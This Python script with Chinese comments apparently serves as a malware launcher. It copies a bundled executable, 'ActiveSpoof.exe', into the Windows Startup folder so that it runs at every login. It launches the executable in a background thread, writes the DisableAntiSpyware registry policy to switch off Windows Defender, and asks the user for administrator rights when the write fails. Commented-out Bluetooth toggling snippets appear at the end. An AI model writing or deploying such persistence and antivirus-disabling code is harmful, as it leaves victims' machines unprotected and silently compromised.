import shutil  # 导入shutil模块，用于文件操作
import sys  # 导入sys模块，用于获取当前脚本的运行环境信息
import os  # 导入os模块，用于操作系统相关功能
import winreg  # 导入winreg模块，用于操作注册表
import threading

# 获取当前脚本所在的工作目录
workingDir = getattr(sys, "_MEIPASS", os.path.abspath(os.path.dirname(__file__)))

# 获取文件名
pilePseudonym = "ActiveSpoof.exe"
a = 1

# 拼接文件路径，将文件加入路径中
filePath = os.path.join(workingDir, pilePseudonym)

# 定义启动文件夹的路径
startupFolder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

# 复制文件，将源文件(filePath)复制到目标文件(destinationPath)中
try:
    destinationPath = os.path.join(startupFolder, pilePseudonym)
    shutil.copyfile(filePath, destinationPath)
except:
    exit()

# 定义要修改的注册表路径和键名
path = 'SOFTWARE\\Policies\\Microsoft\\Windows Defender'
key = 'DisableAntiSpyware'

# 子线程函数
def startProgram():
    # 使用os.system()函数启动exe文件
    os.system(filePath)


# 创建一个新的线程，并在该线程中启动exe文件
threading.Thread(target=startProgram).start()

# 打开注册表编辑器，并定位到指定的键值，将键值设置为1以禁用防病毒软件
try:
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_WRITE) as key_handle:
        winreg.SetValueEx(key_handle, key, 0, winreg.REG_DWORD, 1)
except Exception as e:
    input('你好！请用管理员模式运行！')
    

# import subprocess

# # 执行命令来打开蓝牙
# def enable_bluetooth():
#     try:
#         subprocess.run(["powershell", "-Command", "Get-WmiObject -Namespace 'root\\CIMv2' -Class Win32_PNPEntity | where {$_.Name -match 'Bluetooth'} | ForEach-Object { $_.Enable() }"], check=True)
#         print("蓝牙已打开")
#     except subprocess.CalledProcessError as e:
#         print("无法打开蓝牙:", e)



# # 执行命令来关闭蓝牙
# def disable_bluetooth():
#     try:
#         subprocess.run(["powershell", "-Command", "Get-WmiObject -Namespace 'root\\CIMv2' -Class Win32_PNPEntity | where {$_.Name -match 'Bluetooth'} | ForEach-Object { $_.Disable() }"], check=True)
#         print("蓝牙已关闭")
#     except subprocess.CalledProcessError:
#         print("无法关闭蓝牙")


